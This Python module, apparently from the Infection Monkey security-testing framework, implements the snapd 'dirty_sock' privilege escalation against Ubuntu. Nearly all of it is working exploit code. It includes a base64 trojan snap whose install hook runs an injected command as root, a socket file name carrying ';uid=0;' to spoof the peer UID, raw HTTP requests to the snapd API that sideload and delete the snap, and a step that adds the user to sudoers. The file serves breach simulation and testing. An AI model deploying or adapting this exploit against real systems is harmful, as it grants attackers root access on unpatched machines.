"""
    Implementation is based on snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)
    https://github.com/Dhayalanb/Snapd-V2
    Vulnerable snapd versions <=2.37 and If your snapd version has a reference to something like an Ubuntu
    version number appended to it (example: 2.34.2ubuntu0.1 or 2.35.5+18.10.1), then it might be patched
"""
import os
import time
import string
import socket
import random
import base64
from logging import getLogger

from infection_monkey.utils.environment import OperatingSystem, OperatingSystemTypes, OperatingSystemVersion
from infection_monkey.privilege_escalation.exploiters import HostPrivExploiter
from infection_monkey.privilege_escalation.exploiters.tools import is_sudo_paswordless, run_monkey_as_root
from infection_monkey.exploit.tools.exceptions import FailedExploitationError
LOG = getLogger(__name__)

__author__ = "D3fa1t"

APPEND_COMMENT = " #"
SLEEP = 5   # in sec
PLACEHOLDER_OFFSET = 108  # offset at which we replace the placeholder with our os command
SUDOERS_FILE_CHANGE_BUFFER_TIME = 20  # in seconds

"""
TROJAN_BASE_SNAP contains a simple snap application with an install hook which takes the cmd from the user 
and if the exploit is successful, then the cmd is run as root 

`BQUF` is at offset 108 from the start and is a place holder which would later be replace by the cmd that needs to be 
 run as root
"""

TROJAN_BASE_SNAP = ('''
aHNxcwcAAACe5/ZcAAACAAEAAAABABEA6wEBAAQAAADYAAAAAAAAAEQHAAAAAAAAPAcAAAAAAAD/
/////////0EFAAAAAAAAOwYAAAAAAADsBgAAAAAAAC4HAAAAAAAAIyEvYmluL2Jhc2gKCnRvdWNo
IC9ldGMvUE9DSEFIQSAjQUF''' + 'BQUF' * 340 + '''BQQpuYW1lOiBkaXJ0eS1zb2NrCnZlcnNpb246ICcwLjEnCnN1bW1hcnk6IEVt
cHR5IHNuYXAsIHVzZWQgZm9yIGV4cGxvaXQKZGVzY3JpcHRpb246ICdTZWUgaHR0cHM6Ly9naXRo
dWIuY29tL2luaXRzdHJpbmcvZGlydHlfc29jawoKICAnCmFyY2hpdGVjdHVyZXM6Ci0gYW1kNjQK
Y29uZmluZW1lbnQ6IGRldm1vZGUKZ3JhZGU6IGRldmVsCviACQD9AQAAAACX5/ZcAwAAAAAAAAAA
AAAAIgQAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAP////8BAP0BAAAAAO3k9lwCAAAAAAAAAAIA
AAAeAAAAAQAAAAIAtAEAAAAA+Ln1XAQAAAAAAAAAAAAAACIEAAC/AAAAAQD9AQAAAAD4ufVcAQAA
AAAAAAADAAAALQAbAAcAAAABAP0BAAAAAPnk9lwGAAAAAAAAAAIAAAAeAEUABQAAAAEA/QEAAAAA
+Ln1XAUAAAAAAAAAAwAAABwAYAAHAAAAAQD9AQAAAAD4ufVcBwAAAAAAAAAEAAAAJwB5AAgAAACd
gAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAEAAAAAAAAAAgAAADgAAAABAAQAaG9va3NYAAIA
AgAIAHNuYXAueWFtbAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAAAAAAAAAAABgAAAJgAAAAB
AAQAaG9va3MBAAAAAAAAAAEAAAB4AAAAAQADAG1ldGG4AAQAAQADAHNuYXAQgGAAAAAAAAAA4QQA
AQAAAADaBgAAAAAAADiAeAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAWAAAAAAAAAC4AAAAAAAAAJgA
AAAAAAAA2AAAAAAAAAD0BgAAAAAAAASA6AMAADYH'''+'A'*2990 + '==')


def create_sockfile():
    """
    Generates a random socket file name to use
    This is where we slip on the dirty sock. This makes its way into the
    UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    """
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for _ in range(10))
    dirty_sock = ';uid=0;'
    sockfile = '/tmp/' + random_string + dirty_sock
    LOG.info("Slipped dirty sock on random socket file: " + sockfile)
    return sockfile


def bind_sock(sockfile):
    """
    Binds to a local file.
    This exploit only works if we also BIND to the socket after creating
    it, as we need to inject the dirty sock as a remote peer in the
    socket's ancillary data.
    """
    LOG.info("Binding to socket file...")
    try:
        client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client_sock.bind(sockfile)
        client_sock.connect('/run/snapd.socket')
    except socket.error:
        raise FailedExploitationError('Failed to connect to snapd.socket! The service snapd is not running')
    return client_sock


def delete_snap(client_sock):
    """
    Deletes the trojan snap, if installed
    """
    post_payload = ('{"action": "remove",'
                    ' "snaps": ["dirty-sock"]}')
    http_req = ('POST /v2/snaps HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Type: application/json\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    LOG.info("Deleting trojan snap ...")
    client_sock.sendall(http_req.encode())

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode()

    # Exit on probably-not-vulnerable
    if '"status":"Unauthorized"' in http_reply:
        raise FailedExploitationError

    # Exit on failure
    if 'status-code":202' not in http_reply:
        raise FailedExploitationError

    # We sleep to allow the API command to complete, otherwise the install
    # may fail.
    time.sleep(SLEEP)
    return True


def install_snap(client_sock, trojan_snap):
    """Sideloads the trojan snap"""

    # Decode the base64 from above back into bytes
    blob = base64.b64decode(trojan_snap)

    # Configure the multi-part form upload boundary here:
    boundary = '------------------------f8c156143a1caf97'

    # Construct the POST payload for the /v2/snap API, per the instructions
    # here: https://github.com/snapcore/snapd/wiki/REST-API
    # This follows the 'sideloading' process.
    post_payload = '''
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="devmode"

true
--------------------------f8c156143a1caf97
Content-Disposition: form-data; name="snap"; filename="snap.snap"
Content-Type: application/octet-stream

''' + blob.decode('latin-1') + '''
--------------------------f8c156143a1caf97--'''

    # Multi-part forum uploads are weird. First, we post the headers
    # and wait for an HTTP 100 reply. THEN we can send the payload.
    http_req1 = ('POST /v2/snaps HTTP/1.1\r\n'
                 'Host: localhost\r\n'
                 'Content-Type: multipart/form-data; boundary='
                 + boundary + '\r\n'
                 'Expect: 100-continue\r\n'
                 'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')

    # Send the headers to the snap API
    LOG.info("Installing the trojan snap ...")
    client_sock.sendall(http_req1.encode("utf-8"))

    # Receive the initial HTTP/1.1 100 Continue reply
    http_reply = client_sock.recv(8192).decode("utf-8")

    if 'HTTP/1.1 100 Continue' not in http_reply:
        LOG.error("Error starting POST conversation")
        raise FailedExploitationError

    # Now we can send the payload
    http_req2 = post_payload
    client_sock.sendall(http_req2.encode("latin-1"))

    # Receive the data
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Exit on failure
    if 'status-code":202' not in http_reply:
        raise FailedExploitationError

    # Sleep to allow time for the snap to install correctly. Otherwise,
    # The uninstall that follows will fail, leaving unnecessary traces
    # on the machine.

    time.sleep(SLEEP)
    return True


def run_command_as_root(command):
    """
    This function takes in the command and runs them as root
    if the pe is successful
    :param command: Command to be run as root
    :return: True if the Pe is successful
    """
    global TROJAN_BASE_SNAP
    command = command + APPEND_COMMENT
    index = PLACEHOLDER_OFFSET + len(command)
    trojan_base_snap_decode = base64.b64decode(TROJAN_BASE_SNAP)

    # Create a snap application with out command as the install hook
    trojan_snap = base64.b64encode(b"".join(
        (trojan_base_snap_decode[:PLACEHOLDER_OFFSET], command.encode(), trojan_base_snap_decode[index:])))

    # Create a random name for the dirty socket file
    sockfile = create_sockfile()

    # Bind the dirty socket to the snapdapi
    client_sock = bind_sock(sockfile)
    if not client_sock:
        raise FailedExploitationError

    # Delete trojan snap, in case there was a previous install attempt
    if not delete_snap(client_sock):
        raise FailedExploitationError

    # Install the trojan snap, which has an install hook with user supplied commands
    if not install_snap(client_sock, trojan_snap):
        raise FailedExploitationError

    # Delete the trojan snap
    if not delete_snap(client_sock):
        raise FailedExploitationError

    LOG.info("Command Executed Successfully ")
    return True


class SnapdExploiter(HostPrivExploiter):
    def __init__(self):
        self.file_path = ""
        self.file_name = ""
        self.runnableEnv = OperatingSystem(OperatingSystemTypes.LINUX, OperatingSystemVersion.UBUNTU)

    def _priv_esc(self, command_line):
        """
        The function takes in the command line to run the monkey as an argument
        and tries to run the monkey as a root user.
        :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
        :return: True if the pe is successful
        """
        # Check if the exploit can be tried on this distro
        if not self.runnableEnv.is_on_current_system():
            raise FailedExploitationError("Snapd dirty sock exploiter can't be ran in current env.")

        self.file_path = command_line.split(' ')[0]
        self.file_name = os.path.basename(self.file_path)

        run_command_as_root(self.get_add_user_to_sudoers_command())

        # After user is added to sudoers wait a bit for changes to take effect
        time.sleep(SUDOERS_FILE_CHANGE_BUFFER_TIME)
        if not is_sudo_paswordless():
            self.remove_from_sudoers()
            raise FailedExploitationError("Snapd Privilege escalation seems to have worked, "
                                          "but monkey still can't run paswordless sudo, aborting!")

        LOG.info("Snapd dirty sock privilege escalation successful!")

        LOG.info("Running monkey as root")
        run_monkey_as_root(command_line)

        # now remove the user from sudoers
        self.remove_from_sudoers()
        return True
